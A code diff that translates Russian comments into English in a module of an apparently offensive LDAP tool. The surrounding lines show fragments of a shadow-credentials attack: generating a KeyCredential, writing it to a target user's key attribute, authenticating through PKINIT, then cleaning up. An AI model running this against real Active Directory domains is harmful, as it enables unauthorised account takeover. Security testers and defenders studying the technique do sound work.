@@ -51,7 +51,7 @@ class LdapShellModule(BaseLdapModule):
         self.log = log or logging.getLogger('ldap-shell.shell')
 
     def __call__(self):
-        # Проверка TLS
+        # TLS check
         if not self.client.tls_started and not self.client.server.ssl:
             self.log.info('Sending StartTLS command...')
             if not self.client.start_tls():
@@ -60,7 +60,7 @@ class LdapShellModule(BaseLdapModule):
             else:
                 self.log.info('StartTLS succeeded!')
 
-        # Поиск целевого пользователя
+        # Find target user
         target_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.target)
         if not target_dn:
             self.log.error(f'Target user not found: {self.args.target}')
@@ -68,7 +68,7 @@ class LdapShellModule(BaseLdapModule):
 
         self.log.info(f"Target user found: {self.args.target}")
 
-        # Генерация сертификата и KeyCredential
+        # Generate certificate and KeyCredential
         try:
             certificate = X509Certificate2(
                 subject=self.args.target,
@@ -87,7 +87,7 @@ class LdapShellModule(BaseLdapModule):
 
             self.log.info(f"KeyCredential generated with DeviceID: {key_credential.DeviceId.toFormatD()}")
 
-            # Получение текущих значений и добавление нового ключа
+            # Get current values and add new key
             results = self.client.search(
                 target_dn,
                 '(objectClass=*)',
@@ -112,7 +112,7 @@ class LdapShellModule(BaseLdapModule):
             self.log.info("Successfully added new key")
 
             try:
-                # PKINIT аутентификация
+                # PKINIT authentication
                 pfx_pass = ''.join(chr(random.randint(1,255)) for _ in range(20)).encode()
                 pk = OpenSSL.crypto.PKCS12()
                 pk.set_privatekey(certificate.key)
@@ -154,7 +154,7 @@ class LdapShellModule(BaseLdapModule):
                 self.log.error("This could be because PKINIT is not supported or disabled in the domain")
             
             finally:
-                # Очистка в любом случае
+                # Cleanup in any case
                 self.log.info("Cleaning up DeviceID...")
                 new_values = []
                 for dn_binary_value in current_values:
